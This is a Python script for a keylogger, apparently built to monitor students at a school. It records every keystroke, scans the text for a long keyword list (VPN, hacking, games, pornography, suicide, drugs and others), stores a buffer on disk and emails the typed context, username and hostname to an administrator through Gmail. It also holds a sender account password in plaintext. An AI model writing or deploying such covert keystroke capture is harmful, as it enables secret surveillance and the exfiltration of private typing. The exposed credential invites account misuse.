import keyboard #For keypress detection 
import os # File System Operations
import getpass # Gets current username
import socket # Gets computer hostname
import smtplib # Email Sending
from email.message import EmailMessage # Email Formatting

# Keyword Dictionary -> 'key:value' pairs
KEYWORD_MAP= {
    # VPN variations
    'vpn' : 'vpn',
    'vpnz': 'vpn',
    'vpm' : 'vpn',
    'vpb' : 'vpn', 
    'vpnx': 'vpn',

    # Proxy Variations
    'proxy' : 'proxy', 
    'proxi' : 'proxy',
    'proxxy': 'proxy',
    'proxie': 'proxy', 
    'prox'  : 'proxy',
    'proxu' : 'proxy',

    #Hacking/Cyber threat Variations
    'hacker' : 'hacker',
    'hack' : 'hack', 
    'hak'  : 'hack',
    'hax'  : 'hack',
    'hac'  : 'hack',
    'password crack' : 'password crack',
    'brute force' : 'brute force',
    'ddos' : 'ddos attack',
    'phising' : 'phising',

    #Bypass Variations
    'bypass' : 'bypass',
    'by pass' : 'bypass',
    'bypas' : 'bypass',
    'bypasss' : 'bypass',

    #Gun Variations
    'gun' : 'gun',
    'gunn' : 'gun',
    'guns' : 'gun',

    #Game Variations
    'game' : 'game',
    'games' : 'game',
    'gaming' : 'game',

    #Unblocked Variations
    'unblocked' : 'unblocked',
    'unbocked' : 'unblocked',
    'unblock' : 'unblocked',
    'unbloked' : 'unblocked',
    
    #Movies Variations
    'movies' : 'movies',
    'movie' : 'movies',
    'moviee' : 'movies',

    #Music Variations
    'music' : 'music',
    'musik' : 'music',
    'musix' : 'music',

    #Torrent Variations
    'torrent' : 'torrent',
    'torent'  : 'torrent',
    'toremt'  : 'torrent',
    'torrrent' : 'torrent',
    'tor browser' : 'tor broswer',
    'tor' : 'torrent(maybe)',

    #mp3 Variations
    'mp3' : 'mp3',
    '.mp3' : 'mp3',
    
    #.mp4 Variations
    'mp4' : 'mp4',
    '.mp4' : 'mp4',

    #Anime variations
    'anime' : 'anime',
    'menga' : 'anime',

    #audio, audibooks
    'audio' : 'audio',
    'audiobooks' : 'audio',

    #comics
    'comics' : 'comics',
    'comic' : 'comics',
    'comicbooks' : 'comics',
    'comik' : 'comics',

    #Minecraft Variations
    'minecraft' : 'minecraft',
    'minecraf'  : 'minecraft',

    #Eeaglercraft Variations
    'eaglercraft' : 'eaglercraft',
    'eaglecraft' :  'eaglercraft',
    'eagle craft' : 'eaglercraft',
    'eagle r craft' : 'eaglercraft',

    #Download Variations 
    'download' : 'download',
    'downloader' : 'download',

    #Tunnel Variations
    'tunnel' : 'tunnel',
    'tunneling' : 'tunnel',
    'tunnels' : 'tunnel',

    #Darkweb Variations
    'darkweb' : 'darkweb',
    'dark web' : 'darkweb',
    'dark site' : 'darkweb',

    #illegal variations
    'illegal' : 'illegal',
    'ilegal' : 'illegal',

    #Cheating/Academic Dishonesty
    'cheating' : 'cheating',
    'cheat' : 'cheat',
    'plagiarism' : 'plagiarism',
    'plagerize' : 'plagerize',
    'exam answers' : 'exam answers',

    #Bullying/Harassment
    'bullying' : 'bullying',
    'bully' : 'bully',
    'racist' : 'racist',
    'racism' : 'racism',
    
    #NSFW variations
    'pornography' : 'porn',
    'porn' : 'porn',
    'sex' : 'sex',
    'nudity' : 'nudity',
    'nude' : 'nude',
    'nudes' : 'nudes',
    'baddie' : 'baddie',
    'xxx' : 'xxx(NSFW)',

    #sensitive variations
    'suicide' : 'suicide',
    'self harm' : 'self harm',
    'kill myself' : 'kill myself',
    'want to die' : 'want to die',
    'kill' : 'kill',
    'kills' : 'kills',
    'drugs' : 'drugs',
    'drug' : 'drug',
    'shoot' : 'shoot',
    'bomb' : 'bomb',
    'stab' : 'stab',
    'selfharm' : 'self harm',
    'self harm' : 'self harm',
    'weed' : 'weed (drugs)',
    'marijuana' : 'marijuana',
    'drunk' : 'drunk',
    'alcohol' : 'alcohol',
    'alchohol' : 'alcohol',
    'beer' : 'beer',
    'vape' : 'vape',
    'vaping' : 'vaping',

    #Other concerning terms
    'skip school' : 'skip school'
}

KEYWORDS = list(KEYWORD_MAP.keys()) # All detectable terms

SPECIAL_KEYS = ['shift', 'right shift', 'left shift', 'caps lock', 'up', 'down', 'left', 'right'] #keys to ignore
CONTEXT_CHARS = 10             # Number of characters before/after to include in context 
BUFFER_PERSIST_LIMIT = 30      # How many characters to save to buffer.txt
pending_chars_needed = 10      # Wait this many characters after a keyword

ALERT_EMAIL = 'fletcherit@fletcheracademy.org'
SENDER_EMAIL = 'ypena@fletcheracademy.org'
SENDER_PASSWORD = 'zfme dbpb crhd bjdk'

# --- Setup ---
username = getpass.getuser() #Current Windows user
hostname = socket.gethostname() #Compuer Name
#These next 3 lines of code sets up the buffer.txt file in LOCALAPPDATA\Keylogger\buffer.txt on users files
buffer_dir = os.path.join(os.environ['LOCALAPPDATA'], 'Keylogger')
os.makedirs(buffer_dir, exist_ok=True)
BUFFER_FILE = os.path.join(buffer_dir, 'buffer.txt')

# --- Initialize ---
buffer = "" #this is a temp string that stores recent keystrokes (used for immediate processing) 
            #Used For: Immediate keyword checking (smaller string = faster scans)
            #          Prevents duplicate detections of the same keyword
full_buffer = "" #a complete string that stores all keystrokes in the current session
                 # Used For: Keyword detection scans
                 #           Context capture (10 chars before/after keywords)
                 #           Survives partial sessions (if user logs off mid-typing)
                 
            #Key Advantages:
                #Efficiency: 'buffer' avoids rescanning entire history every keystroke
                #Accuracy: 'full_buffer' ensures complete context capture
                #Reliability: Disk persistence maintains state across sessions

if os.path.exists(BUFFER_FILE): #this checks if buffer.txt exists in the file path we set above
    with open(BUFFER_FILE, 'r') as f:
        #if it exists this will read the content and load it into both buffer and full_buffer, will ensure continuity between sessions 
        buffer = f.read() 
        full_buffer = buffer  

pending_keyword = None #stores the keyword awaiting context. 'None' means no active detection
pending_index = -1 #Position in full_buffer where the keyword was found. '-1' means no valid position
chars_since_pending = 0 #Counts the characters typed after keyword detection

#Function that sends out the email alert via GMAIL's SMTP Server
def send_email_alert(keyword, context):
    try:
        msg = EmailMessage()
        msg['Subject'] = f"ALERT: Keyword '{keyword}' typed by {username}"
        msg['From'] = SENDER_EMAIL
        msg['To'] = ALERT_EMAIL
        msg.set_content(
            f"Keyword Detected: '{keyword}'\n"
            f"User: {username}\n"
            f"Computer: {hostname}\n"
            f"Context: {context}\n"
        )
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
            smtp.login(SENDER_EMAIL, SENDER_PASSWORD)
            smtp.send_message(msg)
        print(f"[+] Alert sent for keyword: {keyword}")
    except Exception as e:
        print(f"[!] Failed to send alert email: {e}")

# Function that detects the keyword typed
def check_for_keywords():
    global pending_keyword, pending_index, chars_since_pending, full_buffer
   
    lowered_buf = full_buffer.lower()

    # Checks if we're waiting to complete a previous detection
    if pending_keyword:
        chars_since_pending += 1
        if chars_since_pending >= pending_chars_needed: #once enough characters are typed after the keyword (10) it captures the context
            start = max(pending_index - CONTEXT_CHARS, 0)
            end = pending_index + len(pending_keyword) + CONTEXT_CHARS
            context = full_buffer[start:end]

            # Gets the cannonical form of the keyword and sends the alert
            cannonical_keyword = KEYWORD_MAP.get(pending_keyword.lower(), pending_keyword)
            send_email_alert(cannonical_keyword, context)
           
            # Resets the pending state completely for new detection
            pending_keyword = None
            pending_index = -1
            chars_since_pending = 0
           
            # Clears the buffer to prevent re-detection of same keyword
            full_buffer = full_buffer[end:]  # Keeps only text after the reported keyword 
            with open(BUFFER_FILE, 'w') as f: 
                f.write(full_buffer[-BUFFER_PERSIST_LIMIT:])
        return

    # Checks for new keyword in entire buffer
    for i in range(len(lowered_buf)):
        for keyword in KEYWORDS:
            if lowered_buf.startswith(keyword.lower(), i):
                #When found, will mark the word as 'pending_keyword', record its position in 'pending_index', 
                #reset the character count, and returns to wait for more context
                pending_keyword = keyword.lower()
                pending_index = i
                chars_since_pending = 0
                return

#This function porcesses every keyboard input
def handle_keypress(event):
    global buffer, full_buffer

    key = event.name

    if len(key) > 1: 
        if key in ['space', 'enter', 'tab', 'esc']:
            char = ' ' #Converts to space
        elif key == 'backspace':
            buffer = buffer[:-1] #Removes last character
            full_buffer = full_buffer[:-1]
            return
        elif key in SPECIAL_KEYS:
            return #Ignores modifier keys
        else:
            char = '' #Ignores other special keys
    else:
        char = key #Captures all regular keyss

    #-----Buffer Management-----
    #Appends the character to both buffers
    buffer += char
    full_buffer += char

    check_for_keywords() #Trigger Detection

    # Saves trimmed buffer (last 30 characters persistently)
    with open(BUFFER_FILE, 'w') as f:
        f.write(full_buffer[-BUFFER_PERSIST_LIMIT:])


print("[*] Keylogger started with reliable on_press input.")
keyboard.on_press(handle_keypress) #Calls handle_keypress function for every key
keyboard.wait() #Keeps running forever

